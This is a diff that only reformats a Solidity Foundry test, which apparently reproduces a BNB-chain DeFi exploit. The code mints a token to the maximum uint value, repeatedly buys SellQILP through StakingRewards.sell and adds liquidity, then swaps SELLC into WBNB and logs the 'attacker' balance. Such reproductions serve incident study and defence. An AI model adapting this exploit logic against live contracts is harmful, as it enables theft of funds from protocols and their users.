@@ -63,7 +63,7 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint(
             "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
-        );
+            );
     }
 
     function init() internal {
@@ -110,7 +110,7 @@ contract ContractTest is Test {
     function init2() internal {
         this.mint(type(uint256).max);
         this.transfer(address(0x000000000000000000000000000000000000dEaD), 1000);
-        for(uint i; i < 10; i++) {
+        for (uint256 i; i < 10; i++) {
             uint256 SellQILPAmount = SellQILP.balanceOf(address(customLP));
             address[] memory path = new address[](2);
             path[0] = address(this);
@@ -118,15 +118,15 @@ contract ContractTest is Test {
             uint256 swapAmountIn = Router.getAmountsIn(SellQILPAmount * 99 / 100, path)[0] * 2; // Calculate the amount needed to swap out the SellQILP in customLP
             StakingRewards.sell(address(this), address(SellQILP), swapAmountIn); // get SellQILP from StakingRewards
             Router.addLiquidity(
-            address(this),
-            address(SellQILP),
-            100 * 1e18,
-            SellQILP.balanceOf(address(this)),
-            0,
-            0,
-            address(this),
-            block.timestamp
-        ); // add more SellQILP into customLP 
+                address(this),
+                address(SellQILP),
+                100 * 1e18,
+                SellQILP.balanceOf(address(this)),
+                0,
+                0,
+                address(this),
+                block.timestamp
+            ); // add more SellQILP into customLP
         }
     }
 
@@ -149,8 +149,9 @@ contract ContractTest is Test {
         address[] memory path = new address[](2);
         path[0] = address(SELLC);
         path[1] = address(WBNB);
-        officalRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( 
-        SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp);
+        officalRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp
+        );
     }
 
     // ------------------- ERC20 interface ---------------------
